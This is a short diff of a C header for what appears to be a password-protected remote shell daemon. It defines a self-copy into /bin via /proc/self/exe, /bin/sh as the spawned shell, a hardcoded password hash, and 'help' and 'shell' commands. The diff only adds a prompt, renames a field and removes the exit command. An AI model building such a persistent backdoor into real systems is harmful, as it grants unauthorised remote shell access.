@@ -19,6 +19,8 @@
 # define TARGET_LOCATION "/bin"
 # define PROC_SELF_EXE "/proc/self/exe"
 
+# define PROMPT "$> "
+
 # define BIN_SHELL "/bin/sh"
 # define READ_END 0
 # define WRITE_END 1
@@ -34,7 +36,7 @@ typedef struct			s_client
 	bool				logged;
 	int					fd_shell;
 	pid_t				shell_pid;
-	pid_t				supervisor_pid;
+	pid_t				output_pid;
 	bool				shell;
 }						t_client;
 
@@ -51,9 +53,9 @@ typedef struct			s_serv
 
 # define HASHED_PWD "0315b4020af3eccab7706679580ac87a710d82970733b8719e70af9b57e7b9e6"
 
-# define NB_CMDS 3
-# define CMD				{"help", "shell", "exit"}
-# define CMD_FUNC			{&show_help, &spawn_shell, &logout}
+# define NB_CMDS 2
+# define CMD				{"help", "shell"}
+# define CMD_FUNC			{&show_help, &spawn_shell}
 
 # define send_str(x,y) send(x, y, strlen(y), 0)
 
